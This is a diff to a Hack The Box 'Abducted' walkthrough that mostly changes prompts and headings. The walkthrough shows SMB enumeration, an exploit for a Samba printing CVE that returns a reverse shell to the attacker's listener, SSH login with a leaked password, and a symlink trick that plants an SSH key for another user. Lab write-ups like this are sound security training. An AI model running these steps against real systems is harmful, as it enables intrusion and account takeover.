@@ -21,7 +21,7 @@ difficulty: Medium
 As usual, I started by scanning ports to identify the services running on the machine.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.43.224
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-08-08 15:13 CET
 Nmap scan report for 10.129.43.224
@@ -41,7 +41,7 @@ Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds
 The next step was enumerating the SMB shares.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ nxc smb abducted.htb -u '' -p '' --shares
 SMB         10.129.43.224  445    ABDUCTED         [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:False) (SMBv1:False) (Null Auth:True)
 SMB         10.129.43.224  445    ABDUCTED         [+] ABDUCTED\: 
@@ -57,10 +57,10 @@ SMB         10.129.43.224  445    ABDUCTED         IPC$                         
 The `nxc` output did not include detailed permissions, so I used `smbclient` to interact with the shares. The `projects` and `transfer` shares were not accessible to the guest account:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ smbclient //10.129.43.224/projects -N
 tree connect failed: NT_STATUS_ACCESS_DENIED
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ smbclient //10.129.43.224/transfer -N
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
@@ -68,7 +68,7 @@ tree connect failed: NT_STATUS_ACCESS_DENIED
 However, I could connect to the `HP-Reception` share:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ smbclient //10.129.43.224/HP-Reception -N
 Try "help" to get a list of possible commands.
 smb: \> 
@@ -77,7 +77,7 @@ smb: \>
 Initially I attempted to list files with `ls` and `dir`, but research showed that `HP-Reception` is a printer share rather than a normal disk share:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ smbclient -L //10.129.43.224 -N
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -90,7 +90,7 @@ Initially I attempted to list files with `ls` and `dir`, but research showed tha
 After some testing I discovered I could upload files to the printer share and submit a print job:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ smbclient //10.129.43.224/HP-Reception -N
 Try "help" to get a list of possible commands.
 smb: \> put test_file
@@ -102,9 +102,11 @@ smb: \>
 
 During further enumeration I found a recently disclosed Samba printing vulnerability (CVE-2026-4480) that looked promising.
 
-## CVE-2026-4480 and a shell as `nobody`
+## Exploitation
 
-### CVE-2026-4480 exploitation
+### CVE-2026-4480 and Shell as `nobody`
+
+#### CVE-2026-4480 Exploitation
 
 Description:
 
@@ -113,7 +115,7 @@ Description:
 A public [exploit](https://github.com/0xBlackash/CVE-2026-4480) was available and worked against the target.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 4444
 
 [*] Target: 10.129.43.224
@@ -140,7 +142,7 @@ A public [exploit](https://github.com/0xBlackash/CVE-2026-4480) was available an
 The exploit opened a connection to my listener and gave a shell as `nobody`:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.43.224 52266
@@ -149,7 +151,7 @@ bash: no job control in this shell
 nobody@abducted:/var/spool/samba$ 
 ```
 
-## Lateral movement
+## Lateral Movement
 
 The system had two non-root users with interactive shells: `scott` and `marcus`.
 
@@ -196,7 +198,7 @@ iXzvcib3SrpZ
 I used the revealed password to try SSH logins for scott and marcus. `scott` was successful:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ nxc ssh abducted.htb -u users.txt -p iXzvcib3SrpZ
 SSH         10.129.43.224   22     abducted.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16
 SSH         10.129.43.224   22     abducted.htb     [+] scott:iXzvcib3SrpZ  Linux - Shell access!
@@ -250,9 +252,9 @@ scott@abducted:/srv/projects$ cd /srv/transfer
 scott@abducted:/srv/transfer$ ln -s /home/marcus .ssh_marcus
 ```
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ ssh-keygen -t ed25519 -N "" -f ./id_marcus
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ echo "ssh-ed25519 [REDACTED] tr3m0x@parrot" >> authorized_keys
 ```
 
@@ -272,14 +274,14 @@ smb: \.ssh_marcus\.ssh\> ls
 Then I SSH'd into the box as `marcus` using the private key:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Abducted]
 └──╼ $ ssh marcus@abducted.htb -i id_marcus
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
 ...
 marcus@abducted:~$ 
 ```
 
-## Privilege escalation to root
+## Privilege Escalation to Root
 
 Inspecting `marcus`'s groups revealed a suspicious `operators` group:
 
